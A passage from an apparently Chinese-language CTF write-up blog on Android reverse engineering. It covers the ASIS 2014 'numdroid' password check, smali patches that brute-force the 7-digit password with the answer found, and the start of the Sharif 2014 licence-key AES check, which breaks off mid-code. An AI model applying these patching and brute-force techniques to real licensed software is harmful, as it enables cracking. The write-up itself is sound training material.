R.string.wrong, <span class="number">1</span>).<span class="built_in">show</span>();</span><br><span class="line">    <span class="keyword">this</span>.mScreen.<span class="built_in">setText</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>点击OK按钮，会先log记录当前的passwd，然后通过Verify.isOk对其进行check，如果密码正确会进入到分支，然后会把flag放到屏幕上，显然这就是胜利条件了</p><p>第一个idea，对isOk进行hook，测试之后发现，他的flag是md5的密码，显然偷鸡失败（&#x2F;(ㄒoㄒ)&#x2F;~~</p><p>那么就要研究isOk函数的逻辑：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="type">static</span> boolean <span class="title">isOk</span><span class="params">(Context c, String _password)</span> </span>&#123;</span><br><span class="line">    String password = _password;</span><br><span class="line">    <span class="keyword">if</span> (_password.<span class="built_in">length</span>() &gt; <span class="number">7</span>) &#123;</span><br><span class="line">        password = _password.<span class="built_in">substring</span>(<span class="number">0</span>, <span class="number">7</span>); <span class="comment">// 只取前7个数字</span></span><br><span class="line">    &#125;</span><br><span class="line">    String r = <span class="built_in">OneWayFunction</span>(password);</span><br><span class="line">    DebugTools.<span class="built_in">log</span>(<span class="string">&quot;digest: &quot;</span> + password + <span class="string">&quot; =&gt; &quot;</span> + r);</span><br><span class="line">    <span class="keyword">return</span> r.<span class="built_in">equals</span>(<span class="string">&quot;be790d865f2cea9645b3f79c0342df7e&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>password只取前7个数字进OneWayFunction函数，之后将其返回的值与一个hash进行比对</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="type">static</span> String <span class="title">OneWayFunction</span><span class="params">(<span class="keyword">final</span> String password)</span> </span>&#123;</span><br><span class="line">    String[] hashes = &#123;<span class="string">&quot;MD2&quot;</span>, <span class="string">&quot;MD5&quot;</span>, <span class="string">&quot;SHA-1&quot;</span>, <span class="string">&quot;SHA-256&quot;</span>, <span class="string">&quot;SHA-384&quot;</span>, <span class="string">&quot;SHA-512&quot;</span>&#125;;</span><br><span class="line">    List&lt;byte[]&gt; bytes = ArrayTools.<span class="built_in">map</span>(ArrayTools.<span class="built_in">select</span>(ArrayTools.<span class="built_in">map</span>(hashes, <span class="keyword">new</span> <span class="built_in">MapAction</span>&lt;String, byte[]&gt;() &#123; <span class="comment">// from class: io.asis.ctf2014.numdriod.Verify.1</span></span><br><span class="line">        @Override <span class="comment">// io.asis.ctf2014.numdriod.tools.MapAction</span></span><br><span class="line">            <span class="keyword">public</span> byte[] <span class="built_in">action</span>(String element) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                MessageDigest digest = MessageDigest.<span class="built_in">getInstance</span>(element);</span><br><span class="line">                digest.<span class="built_in">update</span>(password.<span class="built_in">getBytes</span>());</span><br><span class="line">                <span class="keyword">return</span> digest.<span class="built_in">digest</span>();</span><br><span class="line">            &#125; <span class="built_in">catch</span> (NoSuchAlgorithmException e) &#123;</span><br><span class="line">                <span class="keyword">return</span> null;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;), <span class="keyword">new</span> <span class="built_in">SelectAction</span>&lt;byte[]&gt;() &#123; <span class="comment">// from class: io.asis.ctf2014.numdriod.Verify.2</span></span><br><span class="line">        @Override <span class="comment">// io.asis.ctf2014.numdriod.tools.SelectAction</span></span><br><span class="line">            <span class="keyword">public</span> boolean <span class="built_in">action</span>(byte[] element) &#123;</span><br><span class="line">            <span class="keyword">return</span> element != null;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;), <span class="keyword">new</span> <span class="built_in">MapAction</span>&lt;byte[], byte[]&gt;() &#123; <span class="comment">// from class: io.asis.ctf2014.numdriod.Verify.3</span></span><br><span class="line">        @Override <span class="comment">// io.asis.ctf2014.numdriod.tools.MapAction</span></span><br><span class="line">            <span class="keyword">public</span> byte[] <span class="built_in">action</span>(byte[] element) &#123;</span><br><span class="line">            byte[] b = <span class="keyword">new</span> byte[<span class="number">8</span>];</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; b.length / <span class="number">2</span>; i++) &#123;</span><br><span class="line">                b[i] = element[i];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i2 = <span class="number">0</span>; i2 &lt; b.length / <span class="number">2</span>; i2++) &#123;</span><br><span class="line">                b[(b.length / <span class="number">2</span>) + i2] = element[(element.length - i2) - <span class="number">2</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> b;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    byte[] b2 = <span class="keyword">new</span> byte[bytes.<span class="built_in">size</span>() * <span class="number">8</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; b2.length; i++) &#123;</span><br><span class="line">        b2[i] = bytes.<span class="built_in">get</span>(i % bytes.<span class="built_in">size</span>())[i / bytes.<span class="built_in">size</span>()];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        MessageDigest digest = MessageDigest.<span class="built_in">getInstance</span>(<span class="string">&quot;MD5&quot;</span>);</span><br><span class="line">        digest.<span class="built_in">update</span>(b2);</span><br><span class="line">        byte[] messageDigest = digest.<span class="built_in">digest</span>();</span><br><span class="line">        StringBuilder hexString = <span class="keyword">new</span> <span class="built_in">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">for</span> (byte aMessageDigest : messageDigest) &#123;</span><br><span class="line">            String h = Integer.<span class="built_in">toHexString</span>(aMessageDigest &amp; <span class="number">255</span>);</span><br><span class="line">            <span class="keyword">while</span> (h.<span class="built_in">length</span>() &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                h = <span class="string">&quot;0&quot;</span> + h;</span><br><span class="line">            &#125;</span><br><span class="line">            hexString.<span class="built_in">append</span>(h);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> hexString.<span class="built_in">toString</span>();</span><br><span class="line">    &#125; <span class="built_in">catch</span> (NoSuchAlgorithmException e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现hash基本都是单向的，发现如果只是爆破的话只有10^7的大小，感觉可以尝试</p><h3 id="方案1："><a href="#方案1：" class="headerlink" title="方案1："></a>方案1：</h3><p>网上师傅的方案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">.line 26</span><br><span class="line">  :cond_0</span><br><span class="line">  const/4 v0, 0x0</span><br><span class="line"></span><br><span class="line">  .local v0, &quot;i&quot;:I</span><br><span class="line">  :goto_0</span><br><span class="line">  const v2, 0x98967f</span><br><span class="line"></span><br><span class="line">  if-lt v0, v2, :cond_1</span><br><span class="line"></span><br><span class="line">  .line 38</span><br><span class="line">  return-void</span><br><span class="line"></span><br><span class="line">  .line 28</span><br><span class="line">  :cond_1</span><br><span class="line">  invoke-static &#123;v0&#125;, Ljava/lang/Integer;-&gt;toString(I)Ljava/lang/String;</span><br><span class="line"></span><br><span class="line">  move-result-object v2</span><br><span class="line"></span><br><span class="line">  invoke-static &#123;v2&#125;, Lcom/example/forloop/MainActivity;-&gt;isOk(Ljava/lang/String;)Z</span><br><span class="line"></span><br><span class="line">  move-result v1</span><br><span class="line"></span><br><span class="line">  .line 29</span><br><span class="line">  .local v1, &quot;ok&quot;:Z</span><br><span class="line">  const v2, 0x186a0</span><br><span class="line"></span><br><span class="line">  rem-int v2, v0, v2</span><br><span class="line"></span><br><span class="line">  if-nez v2, :cond_2</span><br><span class="line"></span><br><span class="line">  .line 31</span><br><span class="line">  invoke-static &#123;v0&#125;, Ljava/lang/Integer;-&gt;toString(I)Ljava/lang/String;</span><br><span class="line"></span><br><span class="line">  move-result-object v2</span><br><span class="line"></span><br><span class="line">  invoke-virtual &#123;p0, v2&#125;, Lcom/example/forloop/MainActivity;-&gt;log(Ljava/lang/String;)V</span><br><span class="line"></span><br><span class="line">  .line 33</span><br><span class="line">  :cond_2</span><br><span class="line">  if-eqz v1, :cond_3</span><br><span class="line"></span><br><span class="line">  .line 35</span><br><span class="line">  invoke-static &#123;v0&#125;, Ljava/lang/Integer;-&gt;toString(I)Ljava/lang/String;</span><br><span class="line"></span><br><span class="line">  move-result-object v2</span><br><span class="line"></span><br><span class="line">  invoke-virtual &#123;p0, v2&#125;, Lcom/example/forloop/MainActivity;-&gt;log(Ljava/lang/String;)V</span><br><span class="line"></span><br><span class="line">  .line 26</span><br><span class="line">  :cond_3</span><br><span class="line">  add-int/lit8 v0, v0, 0x1</span><br><span class="line"></span><br><span class="line">  goto :goto_0</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">:cond_0</span><br><span class="line">const/4 v0, 0x0</span><br><span class="line"></span><br><span class="line">.local v0, &quot;i&quot;:I</span><br><span class="line">:goto_0</span><br></pre></td></tr></table></figure><p>这里首先初始化<code>v0=0</code>，然后初始化循环器i（存储在v0中）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">const v2, 0x98967f       # 加载最大值 9,999,999 (0x98967F)</span><br><span class="line">if-lt v0, v2, :cond_1    # 如果 i &gt;= 9,999,999，跳转到 :cond_1（退出循环）</span><br></pre></td></tr></table></figure><p> <code>if v0 less than v2</code>（即<code>v0&lt;v2</code>）就会跳转到<code>cond_1</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">invoke-static &#123;v0&#125;, Ljava/lang/Integer;-&gt;toString(I)Ljava/lang/String;</span><br><span class="line">move-result-object v2     # 将 i 转为字符串</span><br><span class="line">invoke-static &#123;v2&#125;, Lcom/example/forloop/MainActivity;-&gt;isOk(Ljava/lang/String;)Z</span><br><span class="line">move-result v1            # 调用 isOk() 并存储结果到 v1(ok)</span><br></pre></td></tr></table></figure><p>v0转换为字符串，然后将结果存储到v2，之后调用isOk，参数是v2，然后将返回值放入v1</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">const v2, 0x186a0        # 加载 100,000 (0x186A0)</span><br><span class="line">rem-int v2, v0, v2       # 计算 i % 100,000</span><br><span class="line">if-nez v2, :cond_2       # 如果余数为0（每100,000次），执行打印</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">打印当前进度</span></span><br><span class="line">invoke-static &#123;v0&#125;, Ljava/lang/Integer;-&gt;toString(I)Ljava/lang/String;</span><br><span class="line">move-result-object v2</span><br><span class="line">invoke-virtual &#123;p0, v2&#125;, Lcom/example/forloop/MainActivity;-&gt;log(Ljava/lang/String;)V</span><br></pre></td></tr></table></figure><p><code>if v2 no equal zero</code>，就是<code>v2!=0</code>就会跳转到<code>cond_2</code>标签处执行，否则继续执行下一条指令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">:cond_2</span><br><span class="line">if-eqz v1, :cond_3       # 如果 isOk() 返回 true，执行成功逻辑</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">打印成功的数字</span></span><br><span class="line">invoke-static &#123;v0&#125;, Ljava/lang/Integer;-&gt;toString(I)Ljava/lang/String;</span><br><span class="line">move-result-object v2</span><br><span class="line">invoke-virtual &#123;p0, v2&#125;, Lcom/example/forloop/MainActivity;-&gt;log(Ljava/lang/String;)V</span><br></pre></td></tr></table></figure><p>如果<code>v1==0</code>就会打印成功的数字，调用的是log进行打印</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">:cond_3</span><br><span class="line">add-int/lit8 v0, v0, 0x1  # i++</span><br><span class="line">goto :goto_0              # 跳回循环开头</span><br></pre></td></tr></table></figure><p>如果没满足，就执行<code>i++</code>然后跳转回去</p><p>但是为了将其粘贴到apk中就要对其进行修改</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">const/4 v0, 0x0</span><br><span class="line"></span><br><span class="line">.local v0, &quot;i&quot;:I</span><br><span class="line">:goto_3</span><br><span class="line">const v2, 0x98967f</span><br><span class="line"></span><br><span class="line">if-lt v0, v2, :cond_3</span><br><span class="line">return-void</span><br><span class="line"></span><br><span class="line">.line 28</span><br><span class="line">:cond_3</span><br><span class="line">invoke-static &#123;v0&#125;, Ljava/lang/Integer;-&gt;toString(I)Ljava/lang/String;</span><br><span class="line"></span><br><span class="line">move-result-object v2</span><br><span class="line"></span><br><span class="line">invoke-static &#123;p0, v2&#125;, Lio/asis/ctf2014/numdriod/Verify;-&gt;isOk(Landroid/content/Context;Ljava/lang/String;)Z</span><br><span class="line"></span><br><span class="line">move-result v1</span><br><span class="line"></span><br><span class="line">.line 29</span><br><span class="line">.local v1, &quot;ok&quot;:Z</span><br><span class="line"></span><br><span class="line">const v4, 0x186a0</span><br><span class="line"></span><br><span class="line">rem-int v4, v0, v4</span><br><span class="line"></span><br><span class="line">if-nez v4, :cond_6</span><br><span class="line"></span><br><span class="line">.line 31</span><br><span class="line">invoke-static &#123;v0&#125;, Ljava/lang/Integer;-&gt;toString(I)Ljava/lang/String;</span><br><span class="line"></span><br><span class="line">move-result-object v2</span><br><span class="line">invoke-static &#123;v2&#125;, Lio/asis/ctf2014/numdriod/tools/DebugTools;-&gt;log(Ljava/lang/String;)V</span><br><span class="line"></span><br><span class="line">:cond_6</span><br><span class="line"></span><br><span class="line">if-eqz v1, :cond_2</span><br><span class="line"></span><br><span class="line">goto :goto_4</span><br><span class="line">.line 31</span><br><span class="line">invoke-static &#123;v0&#125;, Ljava/lang/Integer;-&gt;toString(I)Ljava/lang/String;</span><br><span class="line"></span><br><span class="line">move-result-object v2</span><br><span class="line"></span><br><span class="line">invoke-static &#123;v2&#125;, Lio/asis/ctf2014/numdriod/tools/DebugTools;-&gt;log(Ljava/lang/String;)V</span><br><span class="line"></span><br><span class="line">.line 26</span><br><span class="line">:cond_2</span><br><span class="line">add-int/lit8 v0, v0, 0x1</span><br><span class="line"></span><br><span class="line">goto :goto_3</span><br></pre></td></tr></table></figure><h3 id="方案2："><a href="#方案2：" class="headerlink" title="方案2："></a>方案2：</h3><p>这个方案是直接将Verify中加个main函数，然后修改一些报错，直接运行即可，参照<a href="https://gist.github.com/volpino/2edea8503822aefb4c9e">https://gist.github.com/volpino/2edea8503822aefb4c9e</a></p><p>得到答案是</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">................&gt; java .\sample\Verify.java</span><br><span class="line">FOUND!! 3130110</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202504141456731.png" alt="image-20250330220516717" style="zoom:50%;" /><h2 id="2014-Sharif-University-Quals-CTF-Commercial-Application"><a href="#2014-Sharif-University-Quals-CTF-Commercial-Application" class="headerlink" title="2014 Sharif University Quals CTF Commercial Application"></a>2014 Sharif University Quals CTF Commercial Application</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="type">void</span> <span class="title">checkLicenceKey</span><span class="params">(<span class="keyword">final</span> Context context)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">this</span>.app.<span class="built_in">getDataHelper</span>().<span class="built_in">getConfig</span>().<span class="built_in">hasLicence</span>()) &#123; <span class="comment">// 如果没有有效许可证</span></span><br><span class="line">          <span class="built_in">showAlertDialog</span>(context, OK_LICENCE_MSG);</span><br><span class="line">          <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      LayoutInflater li = LayoutInflater.<span class="built_in">from</span>(context);</span><br><span class="line">      View promptsView = li.<span class="built_in">inflate</span>(R.layout.propmt, (ViewGroup) null);</span><br><span class="line">      AlertDialog.Builder alertDialogBuilder = <span class="keyword">new</span> AlertDialog.<span class="built_in">Builder</span>(context);</span><br><span class="line">      alertDialogBuilder.<span class="built_in">setView</span>(promptsView);</span><br><span class="line">      <span class="keyword">final</span> EditText userInput = (EditText) promptsView.<span class="built_in">findViewById</span>(R.id.editTextDialogUserInput);</span><br><span class="line">      alertDialogBuilder.<span class="built_in">setCancelable</span>(<span class="literal">false</span>).<span class="built_in">setPositiveButton</span>(<span class="string">&quot;Continue&quot;</span>, <span class="keyword">new</span> DialogInterface.<span class="built_in">OnClickListener</span>() &#123; <span class="comment">// from class: edu.sharif.ctf.activities.MainActivity.4</span></span><br><span class="line">          @Override <span class="comment">// android.content.DialogInterface.OnClickListener</span></span><br><span class="line">          <span class="keyword">public</span> <span class="type">void</span> <span class="built_in">onClick</span>(DialogInterface dialog, <span class="type">int</span> id) &#123;</span><br><span class="line">              String userEnteredValue = userInput.<span class="built_in">getText</span>().<span class="built_in">toString</span>();</span><br><span class="line">              String storedKey = MainActivity.<span class="keyword">this</span>.app.<span class="built_in">getDataHelper</span>().<span class="built_in">getConfig</span>().<span class="built_in">getSecurityKey</span>();</span><br><span class="line">              String iv = MainActivity.<span class="keyword">this</span>.app.<span class="built_in">getDataHelper</span>().<span class="built_in">getConfig</span>().<span class="built_in">getSecurityIv</span>();</span><br><span class="line">              boolean licenceKeyIsValid = KeyVerifier.<span class="built_in">isValidLicenceKey</span>(userEnteredValue, storedKey, iv);</span><br><span class="line">              <span class="keyword">if</span> (licenceKeyIsValid) &#123;</span><br><span class="line">                  MainActivity.<span class="keyword">this</span>.app.<span class="built_in">getDataHelper</span>().<span class="built_in">updateLicence</span>(<span class="number">2014</span>);</span><br><span class="line">                  MainActivity.isRegisterd = <span class="literal">true</span>;</span><br><span class="line">                  MainActivity.<span class="keyword">this</span>.<span class="built_in">showAlertDialog</span>(context, MainActivity.OK_LICENCE_MSG);</span><br><span class="line">                  <span class="keyword">return</span>;</span><br><span class="line">              &#125;</span><br><span class="line">              MainActivity.<span class="keyword">this</span>.<span class="built_in">showAlertDialog</span>(context, MainActivity.NOK_LICENCE_MSG);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;).<span class="built_in">setNegativeButton</span>(<span class="string">&quot;Cancel&quot;</span>, <span class="keyword">new</span> DialogInterface.<span class="built_in">OnClickListener</span>() &#123; <span class="comment">// from class: edu.sharif.ctf.activities.MainActivity.5</span></span><br><span class="line">          @Override <span class="comment">// android.content.DialogInterface.OnClickListener</span></span><br><span class="line">          <span class="keyword">public</span> <span class="type">void</span> <span class="built_in">onClick</span>(DialogInterface dialog, <span class="type">int</span> id) &#123;</span><br><span class="line">              dialog.<span class="built_in">cancel</span>();</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;);</span><br><span class="line">      AlertDialog inputLicenceDialog = alertDialogBuilder.<span class="built_in">create</span>();</span><br><span class="line">      inputLicenceDialog.<span class="built_in">show</span>();</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>关键函数，处理key过程如下</p><p>按下continue之后，usrinput会被转为string进入</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">userEnteredValue</span> <span class="operator">=</span> userInput.getText().toString();</span><br><span class="line"><span class="type">String</span> <span class="variable">storedKey</span> <span class="operator">=</span> MainActivity.<span class="built_in">this</span>.app.getDataHelper().getConfig().getSecurityKey();</span><br><span class="line"><span class="type">String</span> <span class="variable">iv</span> <span class="operator">=</span> MainActivity.<span class="built_in">this</span>.app.getDataHelper().getConfig().getSecurityIv();</span><br><span class="line"><span class="type">boolean</span> <span class="variable">licenceKeyIsValid</span> <span class="operator">=</span> KeyVerifier.isValidLicenceKey(userEnteredValue, storedKey, iv);</span><br></pre></td></tr></table></figure><p>会从配置中得到storedKey和iv，之后进入是否有效的判断</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">static</span> <span class="keyword">final</span> String CIPHER_ALGORITHM = <span class="string">&quot;AES/CBC/PKCS5Padding&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="type">static</span> <span class="keyword">final</span> String VALID_LICENCE = <span class="string">&quot;29a002d9340fc4bd54492f327269f3e051619b889dc8da723e135ce486965d84&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="type">static</span> boolean <span class="title">isValidLicenceKey</span><span class="params">(String userInput, String secretKey, String iv)</span> </span>&#123;</span><br><span class="line">    String encryptUserInputData = <span class="built_in">encrypt</span>(userInput, secretKey, iv);</span><br><span class="line">    <span class="keyword">return</span> encryptUserInputData.<span class="built_in">equals</span>(VALID_LICENCE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="type">static</span> String <span class="title">encrypt</span><span class="params">(String userInput, String secretKey, String iv)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        SecretKeySpec secretKeySpec = <span class="keyword">new</span> <span class="built_in">SecretKeySpec</span>(<span class="built_in">hexStringToBytes</span>(secretKey), <span class="string">&quot;AES&quot;</span>);</span><br><span class="line">        Cipher cipher = Cipher.<span class="built_in">getInstance</span>(CIPHER_ALGORITHM);</span><br><span class="line">        IvParameterSpec ivSpec = <span class="keyword">new</span> <span class="built_in">IvParameterSpec</span>(iv.<span class="built_in">getBytes</span>());</span><br><span class="line">        cipher.<span class="built_in">init</span>(<span class="number">1</span>, secretKeySpec, ivSpec);</span><br><span class="line">        byte[] encryptedBytes = cipher.<span class="built_in">doFinal</span>(userInput.<span class="built_in">getBytes</span>());</span><br><span class="line">        String encryptedText = <span class="built_in">bytesToHexString</span>(encryptedBytes);</span><br><span class="line">        <span class="keyword">return</span> encryptedText;</span><br><span class="line">    &#125; <span class="built_in">catch</span> (Exception e) &#123;</span><br><span class="line">        e.<span class="built_in">printStackTrace</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="type">static</span> String <span class="title">bytesToHexString</span><span class="params">(byte[] bytes)</span> </span>&#123;</span><br><span class="line">    StringBuilder sb = <span class="keyword">new</span> <span class="built_in">StringBuilder</span>();</span><br><span class="line">    <span class="keyword">for</span> (byte b : bytes) &#123;</span><br><span class="line">        sb.<span class="built_in">append</span>(String.format(<span class="string">&quot;%02x&quot;</span>, Integer.<span class="built_in">valueOf</span>(b &amp; <span class="number">255</span>)));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sb.<span class="built_in">toString</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="type">static</span> byte[] <span class="built_in">hexStringToBytes</span>(String s) &#123;</span><br><span class="line">    <span class="type">int</span> len = s.<span class="built_in">length</span>();</span><br><span class="line">    byte[] data = <span class="keyword">new</span> byte[len / <span class="number">2</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i += <span class="number">2</span>) &#123;</span><br><span class="line">        data[i / <span class="number">2</span>] = (byte) ((Character.<span class="built_in">digit</span>(s.<span class="built_in">charAt</span>(i), <span class="number">16</span>) 